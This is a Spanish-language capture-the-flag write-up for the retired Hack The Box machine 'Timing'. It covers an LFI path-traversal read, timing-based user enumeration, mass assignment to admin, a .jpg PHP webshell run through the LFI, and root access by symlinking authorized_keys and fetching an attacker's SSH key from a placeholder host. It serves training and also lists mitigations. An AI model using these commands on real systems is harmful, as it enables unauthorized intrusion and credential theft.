---
machine: Timing
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, php, lfi, timing-attack, mass-assignment, privesc]
---

# Timing — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

`image.php` tiene un LFI que permite leer el código fuente. El login filtra usuarios por tiempo y la app acepta `role` en el JSON, así que un mass assignment convierte la cuenta en admin. Como admin se sube un webshell `.jpg` y se incluye por el LFI. La contraseña de `aaron` está en `db_conn.php`; `netutils` descarga como root y un symlink a `authorized_keys` da acceso SSH como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` Apache con PHP.
- `feroxbuster` encuentra `login.php`, `image.php`, `upload.php`, `admin/` y `db_conn.php`.
- `image.php?image=` carga una imagen desde una ruta.

## Enumeración

- `image.php` es vulnerable a directory traversal y permite leer `db_conn.php` y el resto del código.
- El login comprueba el usuario antes que la contraseña; el tiempo de respuesta distingue usuarios válidos.
- El registro/perfil acepta un objeto JSON y no filtra el campo `role`.

```bash
curl 'http://<IP>/image.php?image=../../../../var/www/html/db_conn.php'
```

## Foothold

Con un usuario válido se entra con la contraseña por defecto o se crackea. Al actualizar el perfil se envía `"role":"admin"` y la aplicación lo acepta (mass assignment). El panel admin permite subir un archivo `.jpg` con PHP; el LFI lo incluye y ejecuta.

```json
{"username":"<USER>","role":"admin"}
```

```text
http://<IP>/image.php?image=uploads/<FILE>.jpg&cmd=id
```

## Movimiento lateral

La shell es `www-data`. `db_conn.php` contiene la contraseña de la base y la de `aaron`; esa contraseña funciona por SSH.

```bash
grep -i 'password' /var/www/html/db_conn.php
ssh aaron@<IP>
```

## Escalada de privilegios

`aaron` puede ejecutar `netutils` como root. La herramienta descarga una URL y guarda el resultado en el directorio actual; se crea un symlink `k.pub` a `/root/.ssh/authorized_keys` y se descarga una clave pública propia. Al conectar por SSH como root se obtiene la flag.

```bash
ln -s /root/.ssh/authorized_keys k.pub
netutils http://<ATTACKER>/id_rsa.pub k.pub
ssh -i id_rsa root@<IP>
```

## Evidencia

- LFI en `image.php` y código fuente.
- Timing attack y usuario válido.
- Mass assignment de `role`.
- Webshell `.jpg` incluido por LFI.
- `netutils` y symlink a `authorized_keys`.

## Lecciones aprendidas

- Un LFI que lee código revela credenciales y lógica de autorización.
- Los tiempos de respuesta del login filtran usuarios.
- Aceptar `role` desde el cliente es una escalada directa.
- Una descarga como root con destino controlado es escritura arbitraria.

## Mitigación y detección

- Normalizar rutas y usar listas blancas en `image.php`.
- Comparar credenciales en tiempo constante y no distinguir usuarios.
- Asignar roles solo en servidor y validar el esquema.
- Evitar descargas como root y usar `O_NOFOLLOW`; revisar symlinks en directorios de usuario.

## Referencias

- [0xdf — Timing](https://0xdf.gitlab.io/2022/06/04/htb-timing.html)
- [IppSec — Timing](https://www.youtube.com/watch?v=hmtnxLUqRhQ)
- [Hack The Box — Timing](https://app.hackthebox.com/machines/timing)
